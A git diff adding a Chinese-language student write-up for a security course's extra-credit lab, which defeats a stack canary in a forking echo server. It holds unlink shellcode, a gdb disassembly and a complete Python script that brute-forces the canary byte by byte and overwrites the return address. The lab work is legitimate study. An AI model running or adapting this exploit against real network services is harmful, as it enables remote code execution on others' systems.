@@ -7,6 +7,7 @@
     + [Target4 Double free](#target4-double-free)
     + [Target5 Format string](#target5-format-string)
     + [Target6 Global offset table](#target6-global-offset-table)
+    + [Extra credit bypass stack canary](#extra-credit-bypass-stack-canary)
 
 # Proj1
 ## Target1 Buffer overflow
@@ -721,4 +722,334 @@ int main(void)
 
   return 0;
 }
+```
+
+## Extra credit bypass stack canary
+```c
+int freadline(int fd, char *buf) {
+  int i = 0;
+  char next;
+  for (;;) {
+    int c = read(fd, &next, 1);
+    if (c <= 0) {
+      break;
+    }
+
+    if (next == '\n') {
+      return i;
+    }
+
+    buf[i] = next;
+
+    i++;
+  }
+  return -1;
+}
+
+int respond_once(int clientfd) {
+  char buf[2048];
+
+  int line_len = freadline(clientfd, buf);
+  if (line_len <= 0) {
+    write(clientfd, "done\r\n", 6);
+    close(clientfd);
+    return -1;
+  }
+
+  write(clientfd, buf, line_len);
+  write(clientfd, "\r\n", 2);
+  return line_len;
+}
+
+void echo_server(int clientfd) {
+
+  while (respond_once(clientfd) >= 0) {
+    ;;
+  }
+}
+
+/* socket-bind-listen idiom */
+static int start_server(const char *portstr)
+{
+    struct addrinfo hints = {0}, *res;
+    int sockfd;
+    int e, opt = 1;
+
+    hints.ai_family = AF_UNSPEC;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_flags = AI_PASSIVE;
+
+    if ((e = getaddrinfo(NULL, portstr, &hints, &res)))
+        errx(1, "getaddrinfo: %s", gai_strerror(e));
+    if ((sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol)) < 0)
+        err(1, "socket");
+    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)))
+        err(1, "setsockopt");
+    if (fcntl(sockfd, F_SETFD, FD_CLOEXEC) < 0)
+        err(1, "fcntl");
+    if (bind(sockfd, res->ai_addr, res->ai_addrlen))
+        err(1, "bind");
+    if (listen(sockfd, 5))
+        err(1, "listen");
+    freeaddrinfo(res);
+
+    return sockfd;
+}
+
+int main() {
+  char *portstr = "5555";
+  int serverfd = start_server(portstr);
+  warnx("Listening on port %s", portstr);
+  signal(SIGCHLD, SIG_IGN);
+  signal(SIGPIPE, SIG_IGN);
+
+  for (;;) {
+    int clientfd = accept(serverfd, NULL, NULL);
+    int pid;
+    switch ((pid = fork()))
+    {
+    case -1: /* error */
+        err(1, "fork");
+        close(clientfd);
+    case 0:  /* child */
+        echo_server(clientfd);
+        break;
+    default: /* parent */
+        close(clientfd);
+    }
+  }
+
+  return 0;
+}
+```
+题目的要求是，攻击本地服务器，删除文件`/tmp/passwd`，要实现shellcode也要实现buffer overflow
+
+首先分析下target，main函数很长，要攻击的部分很短，只有以下这部分，其他都是实现一个echo服务器。可以看出，就是stack smash，但是打开`Makefile`可以看到这一行，他把`-fstack-protector-all`给打开了，导致会加上stack guard来防止buffer overflow。这个实验的目的就是学会如何绕开stack canary从而实现攻击。
+
+特别要注意的一点是，`\n`的ascii码是`\x0a`，`int freadline(int fd, char *buf)`函数中，当遇到`\n`时会停下，所以**输入的buf中不能有`\x0a`**
+```Makefile
+extra-credit.o: extra-credit.c
+  $(CC) $< -c -o $@ -fstack-protector-all -ggdb -m32 -g -std=c99 -D_GNU_SOURCE
+```
+```c
+int freadline(int fd, char *buf) {
+  int i = 0;
+  char next;
+  for (;;) {
+    int c = read(fd, &next, 1);
+    if (c <= 0) {
+      break;
+    }
+
+    if (next == '\n') {
+      return i;
+    }
+
+    buf[i] = next;
+
+    i++;
+  }
+  return -1;
+}
+
+int respond_once(int clientfd) {
+  char buf[2048];
+
+  int line_len = freadline(clientfd, buf);
+  if (line_len <= 0) {
+    write(clientfd, "done\r\n", 6);
+    close(clientfd);
+    return -1;
+  }
+
+  write(clientfd, buf, line_len);
+  write(clientfd, "\r\n", 2);
+  return line_len;
+}
+```
+先来实现shellcode，要删除/tmp/passwd可以用系统调用`unlink`，但是特别要注意的是，**`unlink`的sys_no就是10也就是`\x0a`**，这会导致shellcode拷贝了一半就停下echo回来了。所以要把`%al`里面的10拆开，先放入5然后再放入5即可
+```asm
+#include <sys/syscall.h>
+
+#define STRING  "/tmp/passwd"
+#define STRLEN  11
+#define ARGV  (STRLEN+1)
+#define ENVP  (ARGV+4)
+
+.globl main
+  .type main, @function
+
+ main:
+  jmp calladdr
+
+ popladdr:
+  popl  %esi
+  movl  %esi,(ARGV)(%esi)    /* set up argv pointer to pathname */
+  xorl  %eax,%eax            /* get a 32-bit zero value */
+  movb  %al,(STRLEN)(%esi)   /* null-terminate our string */
+  movl  %eax,(ENVP)(%esi)    /* set up null envp */
+
+  movb  $5,%al               /* syscall arg 1: syscall number */
+  add   $5,%al  
+  movl  %esi,%ebx            /* syscall arg 2: string pathname */
+  leal  ARGV(%esi),%ecx      /* syscall arg 2: argv */
+  leal  ENVP(%esi),%edx      /* syscall arg 3: envp */
+  int $0x80                  /* invoke syscall */
+
+  xorl  %ebx,%ebx            /* syscall arg 2: 0 */
+  movl  %ebx,%eax
+  inc %eax                   /* syscall arg 1: SYS_exit (1), uses */
+                             /* mov+inc to avoid null byte */
+  int $0x80                  /* invoke syscall */
+
+ calladdr:
+  call  popladdr
+  .ascii  STRING
+
+```
+有了shellcode就可以overflow buffer啦，先来看看这个stack canary到底是什么鬼，看到`0x080488c7`位置，`mov    -0xc(%ebp),%edx`然后`xor    %gs:0x14,%edx`，可以看出`%ebp`往下12的位置是canary，xor为了验证是否一样，如果canary变了，`__stack_chk_fail`会报错。（好像通过修改GOT来改变`__stack_chk_fail`的跳转地址也能实现攻击）
+```console
+(gdb) disass respond_once
+Dump of assembler code for function respond_once:
+   0x08048816 <+0>: push   %ebp
+   0x08048817 <+1>: mov    %esp,%ebp
+   0x08048819 <+3>: sub    $0x828,%esp
+   0x0804881f <+9>: mov    0x8(%ebp),%eax
+   0x08048822 <+12>:  mov    %eax,-0x81c(%ebp)
+   0x08048828 <+18>:  mov    %gs:0x14,%eax
+   0x0804882e <+24>:  mov    %eax,-0xc(%ebp)
+   0x08048831 <+27>:  xor    %eax,%eax
+   0x08048833 <+29>:  sub    $0x8,%esp
+   0x08048836 <+32>:  lea    -0x80c(%ebp),%eax
+   0x0804883c <+38>:  push   %eax
+   0x0804883d <+39>:  pushl  -0x81c(%ebp)
+   0x08048843 <+45>:  call   0x804879b <freadline>
+   0x08048848 <+50>:  add    $0x10,%esp
+   0x0804884b <+53>:  mov    %eax,-0x810(%ebp)
+   0x08048851 <+59>:  cmpl   $0x0,-0x810(%ebp)
+   0x08048858 <+66>:  jg     0x804888a <respond_once+116>
+   0x0804885a <+68>:  sub    $0x4,%esp
+   0x0804885d <+71>:  push   $0x6
+   0x0804885f <+73>:  push   $0x8048bf0
+   0x08048864 <+78>:  pushl  -0x81c(%ebp)
+   0x0804886a <+84>:  call   0x80485d0 <write@plt>
+   0x0804886f <+89>:  add    $0x10,%esp
+   0x08048872 <+92>:  sub    $0xc,%esp
+   0x08048875 <+95>:  pushl  -0x81c(%ebp)
+   0x0804887b <+101>: call   0x8048680 <close@plt>
+   0x08048880 <+106>: add    $0x10,%esp
+   0x08048883 <+109>: mov    $0xffffffff,%eax
+   0x08048888 <+114>: jmp    0x80488c7 <respond_once+177>
+   0x0804888a <+116>: mov    -0x810(%ebp),%eax
+   0x08048890 <+122>: sub    $0x4,%esp
+   0x08048893 <+125>: push   %eax
+   0x08048894 <+126>: lea    -0x80c(%ebp),%eax
+   0x0804889a <+132>: push   %eax
+   0x0804889b <+133>: pushl  -0x81c(%ebp)
+   0x080488a1 <+139>: call   0x80485d0 <write@plt>
+   0x080488a6 <+144>: add    $0x10,%esp
+   0x080488a9 <+147>: sub    $0x4,%esp
+   0x080488ac <+150>: push   $0x2
+   0x080488ae <+152>: push   $0x8048bf7
+   0x080488b3 <+157>: pushl  -0x81c(%ebp)
+   0x080488b9 <+163>: call   0x80485d0 <write@plt>
+   0x080488be <+168>: add    $0x10,%esp
+   0x080488c1 <+171>: mov    -0x810(%ebp),%eax
+   0x080488c7 <+177>: mov    -0xc(%ebp),%edx
+   0x080488ca <+180>: xor    %gs:0x14,%edx
+   0x080488d1 <+187>: je     0x80488d8 <respond_once+194>
+   0x080488d3 <+189>: call   0x8048590 <__stack_chk_fail@plt>
+   0x080488d8 <+194>: leave
+   0x080488d9 <+195>: ret
+End of assembler dump.
+```
+下面开始暴力破解canary，canary的大小是4个byte，比如`0xc5298600`，因为little edian，在内存里面表示是`\x00\x86\x29\xc5`，只要逐个十六进制数破解即可，然后塞入8个byte的JUNK，然后是`%old_ebp`，然后就是`return address`，所以buffer如下所示
+```python
+final_exploit = sploitstring + canary + "JUNKJUNK" + struct.pack("<I", 0xbfffeddc) + struct.pack("<I", 0xbfffeddc)
+```
+**注意注意，buf里面不能有`\x0a`**，所以在从`0x0`到`0xf`的循环过程中，一定要跳过`\x0a`，不然的话就会停止拷贝。之前没有跳过`\x0a`卡了三个小时。。。（但是好像如果canary里头就有`\x0a`，好像buffer overflow就挂了，那咋办啊？？？
+
+不管这么多，看到`/tmp`底下果然没有`passwd`，bingo！
+
+**proj1终于写完啦！撒花！**
+```console
+user@vm-cs155:~/cs155/proj1/sploits$ echo "a" > /tmp/passwd; ./extra-credit.py 127.0.0.1 5555; ls /tmp/
+extra-credit                                                                       target1  target3  target5
+systemd-private-cb4299414fa940e5bdeb7372cd9880ab-systemd-timesyncd.service-TZOrP2  target2  target4  target6
+```
+```python
+#!/usr/bin/python2
+import sys
+import socket
+import traceback
+import struct
+
+####
+
+## This function takes your exploit code, adds a carriage-return and newline
+## and sends it to the server. The server will always respond, but if the
+## exploit crashed the server it will close the connection. Therefore, we try
+## to write another query to the server, recv on the socket and see if we get
+## an exception
+##
+## True means the exploit made the server close the connection (i.e. it crashed)
+## False means the socket is still operational.
+def try_exploit(exploit, host, port):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect((host, port))
+    sock.send("%s\n" % exploit)
+    b = 0
+    while b < (len(exploit) + 1):
+        mylen = len(sock.recv(4098))
+        b += mylen
+        if mylen == 0:
+            return True
+    sock.send("\n")
+    try:
+        return len(sock.recv(5)) == 0
+    except:
+        return True
+
+def exploit(host, port, shellcode):
+    # Build your exploit here
+    # One useful function might be
+    #   struct.pack("<I", x)
+    # which returns the 4-byte binary encoding of the 32-bit integer x
+    BUFFER_SIZE = 2048
+    sploitstring = "\x90" * BUFFER_SIZE
+    sploitstring = sploitstring[:200] + shellcode + sploitstring[200+len(shellcode):]
+    try_char_int = 0
+    canary = ""
+    count = 0
+    while True:
+        if count == 4:
+            break
+        for i in xrange(0, 256):
+            if i == 10:
+                continue
+            try_char = struct.pack("<I", i)[:1]
+            cur_exploit = sploitstring + canary + try_char
+            if not try_exploit(cur_exploit, host, port):
+                # Connection still up
+                canary += try_char
+                count += 1
+                break
+    final_exploit = sploitstring + canary + "JUNKJUNK" + struct.pack("<I", 0xbfffeddc) + struct.pack("<I", 0xbfffeddc)
+    try_exploit(final_exploit, host, port)
+
+####
+
+if len(sys.argv) != 3:
+    print("Usage: " + sys.argv[0] + " host port")
+    exit()
+
+try:
+    shellfile = open("shellcode.bin", "r")
+    shellcode = shellfile.read()
+    exploit(sys.argv[1], int(sys.argv[2]), shellcode)
+
+except:
+    print("Exception:")
+    print(traceback.format_exc())
+
 ```
